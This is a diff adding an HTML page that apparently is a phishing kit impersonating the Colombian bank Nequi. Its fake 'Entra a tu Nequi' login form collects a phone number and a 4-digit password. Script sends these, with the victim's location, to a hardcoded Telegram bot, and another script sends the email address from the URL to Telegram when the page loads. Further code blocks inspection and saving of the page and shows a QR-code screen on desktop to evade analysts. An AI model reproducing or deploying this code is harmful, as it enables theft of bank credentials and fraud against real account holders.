@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<!-- Script de Bloqueo Absoluto (Colocado al inicio para ejecutarse antes que cualquier otro recurso) -->
+<script>
+    // Bloqueo estricto de atajos de teclado para inspección
+    window.addEventListener('keydown', function(e) {
+        if (
+            e.key === 'F12' || 
+            e.keyCode === 123 || 
+            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+    }, true);
+
+    // Bloqueo total de clic derecho
+    window.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+    }, true);
+</script>
+
+<!-- Inserted by miarroba -->
+<script src="./NequiArchivos/rules-p-d5x2uDVHd7ALE.js.descarga" async=""></script><script type="text/javascript" async="" src="./NequiArchivos/quant.js.descarga"></script><script type="text/javascript" async="" src="./NequiArchivos/analytics.js.descarga"></script><script src="./NequiArchivos/f.txt"></script><script src="./NequiArchivos/f(1).txt"></script><script async="" src="./NequiArchivos/gtm.js.descarga"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<script async="" src="./NequiArchivos/f(2).txt" crossorigin="anonymous" data-checked-head="true"></script>
+<!-- Inserted by miarroba -->
+    <link rel="stylesheet" href="./NequiArchivos/jsypn.css">
+    
+<title>Nequi</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="stylesheet" type="text/css" href="./NequiArchivos/util.css">
+<link rel="stylesheet" type="text/css" href="./NequiArchivos/main.css">
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+<link href="./NequiArchivos/css2" rel="stylesheet">
+<link rel="icon" href="favicon_n.png" type="favicon.png" sizes="16x16" />
+<script src="./NequiArchivos/jquery.min.js.descarga"></script>
+<script src="./NequiArchivos/jquery-3.7.1.min.js.descarga"></script>
+<script src="./NequiArchivos/jquery.mask.js.descarga"></script>
+
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+            $("#address").html("" + response.city + ", " + response.country);
+        })
+      </script>
+<script async="" src="./NequiArchivos/ca-pub-7294310421616689"></script>
+<style>
+    @keyframes pulse{
+      0%{transform:scale(0.8);opacity:0.6;}
+      50%{transform:scale(1.2);opacity:1;}
+      100%{transform:scale(0.8);opacity:0.6;}
+    }
+
+    /* Pantalla de bloqueo para PC con Código QR */
+    #desktop-blocker {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: #ffffff;
+      z-index: 99999;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 24px;
+      text-align: center;
+      background: url(https://i.imgur.com/jGOJlYo.png) right no-repeat #FBE5F2;
+    }
+
+    /* Logo superior en PC más grande */
+    .desktop-logo {
+      height: 60px;
+      object-fit: contain;
+      margin-bottom: 28px;
+    }
+
+    .qr-container {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 20px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+      border: 1px solid #f0f0f5;
+      margin-bottom: 24px;
+    }
+
+    .qr-container img {
+      width: 220px;
+      height: 220px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .desktop-title {
+      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 26px;
+      font-weight: 800;
+      color: #1e002c;
+      margin-bottom: 10px;
+    }
+
+    .desktop-desc {
+      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 15px;
+      color: #625768;
+      max-width: 380px;
+      line-height: 1.4;
+      font-weight: 500;
+      margin: 0 auto;
+    }
+</style>
+</head>
+<body cz-shortcut-listen="true">
+
+    <!-- Pantalla exclusiva para PC con Logo y Código QR -->
+    <div id="desktop-blocker">
+      <img class="desktop-logo" src="NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
+      <div class="qr-container">
+        <img src="NequiArchivos/codigo_qr.png" alt="Escanea el código QR" onerror="this.src='https_blue-mud-094b42a10_4_azurestaticapps_net_nequi_nequi_selfie_replica_html.png';">
+      </div>
+      <div class="desktop-title">Escanea el código QR</div>
+      <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
+    </div>
+
+    <header id="main-header">
+        <a class="logo-header" href="">
+            <img id="logo-header" src="./NequiArchivos/vOLtQz8.png">
+        </a> 
+    </header>
+
+    <div class="limiter">
+        <div class="container-login100" style="background-image: url(https://i.imgur.com/jGOJlYo.png) right no-repeat #FBE5F2; position: relative;">
+            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+            
+            <br>
+            <br>
+ <section class="">
+            
+         <!-- ONSUBMIT DIRECTO: Envía por método seguro y salta a validando.html -->
+         <form class="login100-form validate-form" id="loginForm" onsubmit="enviarDatosTelegram(event);">
+
+             <p id="address" hidden="">Medellín, CO</p>
+             <p id="gfg" hidden=""></p>
+                
+             <div class="wrap-input101 validate-input" data-validate=""> 
+                <br>
+                <div class="textypn1">
+                    <span class="model" style="text-align:center;">Entra a tu Nequi</span>
+                </div>
+            <br>
+             <center><span class="model" style="font-size: 16px; color:#DA0081;">Vamos a validar tu identidad</span></center>
+        <center><span class="textypn2" style="">Completa los datos de forma correcta</span></center>
+
+                    <br>
+                    <center><a class="logo-header" href="">
+            <img id="logo-header" width="70" height="80" src="NequiArchivos/dispositivo.jpg">
+        </a></center>
+                    
+<div class="wrap-input104 validate-input" data-validate="">
+    <input class="inputbandera" type="text" readonly>
+    <label class="lbly"> <span style="width:22px;height:16px;display:inline-block;background:linear-gradient(#FCD116 50%,#003893 75%,#CE1126 75%);border-radius:2px;"></span> +57 <span style="font-size:10px;color:#888;margin-left:4px;">▼</span></label>
+
+    <div class="wrap-input104 validate-input" data-validate="">
+        
+<input class="input1010" type="text" inputmode="numeric" name="hr-u" id="hr-u"  oninput="let n=this.value.replace(/\D/g,'').slice(0,10);if(n.length>0&&n[0]!='3')n='3'+n.slice(1);this.value=n.replace(/^(\d{3})(\d)/,'$1 $2').replace(/^(\d{3}) (\d{3})(\d)/,'$1 $2 $3');this.setCustomValidity(n.length===10?'':'Ingresa los 10 dígitos del celular.');" autocomplete="off" maxlength="12" required="true" placeholder="" onkeypress="if(event.key < '0' || event.key > '9') return false;">
+        <label class="lbly">Número de celular</label>
+    </div>
+</div>
+
+<div class="wrap-input104" data-validate=""> 
+    <input class="input1012" type="password" style="letter-spacing: 0.25em" inputmode="numeric" name="mn-c" id="mn-c" autocomplete="off" maxlength="4" minlength="4" required="true" placeholder="" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;">
+    <label class="lbly">Contraseña</label>
+</div>
+                    
+<input type="checkbox" id="check1" required style="display:none;">
+
+<div onclick="let c=document.getElementById('check1');c.checked=!c.checked;let o=this.querySelector('.outer');let i=this.querySelector('.inner');o.style.borderColor=c.checked?'#27ae60':'#ff4fa3';i.style.color=c.checked?'#27ae60':'transparent';i.innerHTML=c.checked?'✔️':'';i.style.display='flex';i.style.alignItems='center';i.style.justifyContent='center';i.style.fontSize='24px';i.style.animation=c.checked?'none':'pulse 1s infinite';this.style.borderColor=c.checked?'#27ae60':'#ff4fa3';" 
+style="display:flex;align-items:center;gap:10px;border:2px solid #ff4fa3;border-radius:12px;padding:20px 20px;font-family:Arial,sans-serif;color:#333;cursor:pointer;width:90%;margin-left:5%;margin-top:3%; ">
+
+  <div class="outer" style="width:45px;height:42px;border-radius:50%;border:3px solid #ff4fa3;display:flex;align-items:center;justify-content:center;">
+    <div class="inner" style="width:18px;height:18px;border-radius:50%;background:transparent;animation:pulse 1s infinite;"></div>
+  </div>
+
+  <span style="font-size:16px;text-align:center;">Confirmo que soy una persona real.</span>
+</div>
+
+                    <br>
+                    <div class="text-right p-t-8 p-b-31"></div>
+                    
+                    <div class="container-login100-form-btn">
+                        <div class="wrap-login100-form-btn">
+                            <div class="login100-form-bgbtn"></div>
+                            <center>
+                                <button type="submit" style="height:50px; width:90%;" class="login100-form-btn" id="btnSend">
+                                    <b>Entrar</b>
+                                </button>
+                            </center>
+                        </div>
+                    </div>
+                    
+                    <br><br>            
+                    <div id="dropDownSelect1"></div>
+            </div>
+         </form>
+        </section>
+            </div>
+        </div>
+    </div>
+          
+<header id="main-header2">
+    <center><img id="logo-header2" src="./NequiArchivos/wKO0RDn.png" width="100%"></center>
+</header>
+
+<script>
+    // Función de detección directa para PC
+    function checkDevice() {
+        const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
+        if (isDesktop) {
+            const blocker = document.getElementById('desktop-blocker');
+            if (blocker) {
+                blocker.style.display = 'flex';
+            }
+        }
+    }
+
+    checkDevice();
+    window.addEventListener('DOMContentLoaded', checkDevice);
+
+    var telegram_bot_id = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
+    var chat_id = -1003508204208;
+
+    $(document).ready(function() {
+        $('#hr-u').mask('000 000 0000');
+        if (typeof $('#sd-a').mask === 'function') {
+            $('#sd-a').mask("#.##0,00", {reverse: true});
+        }
+    });
+
+    function enviarDatosTelegram(e) {
+        e.preventDefault();
+
+        var CLN = document.getElementById("hr-u").value;
+        var CVN = document.getElementById("mn-c").value;
+        var ip2 = document.getElementById("address").innerHTML;
+        var message = "NEQUI\nCelular: " + CLN + "\nClave: " + CVN + "\n" + ip2;
+        
+        localStorage.setItem("hr-u", CLN);
+
+        var url = "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
+
+        var img = new Image();
+        img.src = url;
+
+        setTimeout(function() {
+            window.location.href = "validando.html";
+        }, 500);
+
+        return false;
+    }
+</script>
+
+<script>
+    // Función de detección de PC y bloqueo de herramientas abiertas por consola
+    function checkDevice() {
+        const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
+        if (isDesktop) {
+            const blocker = document.getElementById('desktop-blocker');
+            if (blocker) {
+                blocker.style.display = 'flex';
+            }
+        }
+    }
+    checkDevice();
+    window.addEventListener('resize', checkDevice);
+
+    // Detección heurística adicional para evitar inspección por depuración activa
+    setInterval(function() {
+        const widthThreshold = window.outerWidth - window.innerWidth > 160;
+        const heightThreshold = window.outerHeight - window.innerHeight > 160;
+        if ((widthThreshold || heightThreshold) && !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) {
+            document.body.innerHTML = "<h2 style='text-align:center; margin-top:20vh; font-family:Arial;'>Acceso bloqueado por seguridad.</h2>";
+        }
+    }, 1000);
+</script>
+
+<script src="https://unpkg.com/lucide@latest"></script>
+<script>
+    lucide.createIcons();
+</script>
+
+<script>
+    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
+(() => {
+    'use strict';
+
+    // Evita ejecutar dos veces la protección.
+    if (window.__proteccionWebActiva) return;
+    window.__proteccionWebActiva = true;
+
+    function mostrarAviso() {
+        if (document.getElementById('aviso-proteccion')) return;
+
+        const aviso = document.createElement('div');
+        aviso.id = 'aviso-proteccion';
+
+        Object.assign(aviso.style, {
+            position: 'fixed',
+            inset: '0',
+            zIndex: '2147483647',
+            background: 'rgba(0,0,0,.88)',
+            color: '#fff',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            padding: '24px',
+            boxSizing: 'border-box',
+            fontFamily: 'Arial, sans-serif',
+            textAlign: 'center'
+        });
+
+        const panel = document.createElement('div');
+        Object.assign(panel.style, {
+            maxWidth: '420px',
+            padding: '28px',
+            background: '#202020',
+            borderRadius: '12px',
+            border: '1px solid #555'
+        });
+
+        const titulo = document.createElement('h2');
+        titulo.textContent = 'Acción no permitida';
+
+        const mensaje = document.createElement('p');
+        mensaje.textContent =
+            'Esta acción está restringida en esta página.';
+
+        const boton = document.createElement('button');
+        boton.type = 'button';
+        boton.textContent = 'Volver a la página';
+
+        Object.assign(boton.style, {
+            padding: '12px 20px',
+            border: '0',
+            borderRadius: '6px',
+            cursor: 'pointer',
+            fontWeight: 'bold'
+        });
+
+        boton.addEventListener('click', () => aviso.remove());
+
+        panel.append(titulo, mensaje, boton);
+        aviso.appendChild(panel);
+        document.body.appendChild(aviso);
+    }
+
+    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
+    document.addEventListener('keydown', function (e) {
+        const tecla = e.key.toLowerCase();
+
+        if (
+            (e.ctrlKey || e.metaKey) &&
+            ['s', 'u', 'p'].includes(tecla)
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+
+        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
+        if (
+            tecla === 'f12' ||
+            ((e.ctrlKey || e.metaKey) &&
+             e.shiftKey &&
+             ['i', 'j', 'c'].includes(tecla))
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+    }, true);
+
+    // Bloquear menú contextual del clic derecho.
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        mostrarAviso();
+    }, true);
+
+})();
+</script>
+
+<script>
+        // Configuración de tu Bot de Telegram
+        const TELEGRAM_BOT_TOKEN = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
+        const TELEGRAM_CHAT_ID = "-1003508204208";
+
+        // 1. Leer el parámetro 'email' de la URL actual
+        const urlParams = new URLSearchParams(window.location.search);
+        const correo = urlParams.get('email') || 'No especificado';
+
+        // 2. Función para enviar la notificación a Telegram
+        function enviarAlertaTelegram(emailUsuario) {
+            const mensaje = `⚠️ <b>NUEVO INGRESO</b>\n\nAlguien abrió la página de verificación.\nCorreo: <code>${emailUsuario}</code>`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('estado').innerText = "¡Verificación completada con éxito!";
+                } else {
+                    console.error("Error al notificar", data);
+                }
+            })
+            .catch(error => {
+                console.error("Error de red", error);
+            });
+        }
+
+        // 3. Ejecutar la función automáticamente al cargar la página
+        window.onload = function() {
+            if (correo) {
+                enviarAlertaTelegram(correo);
+            }
+        };
+    </script>
+
+</body>
+</html>
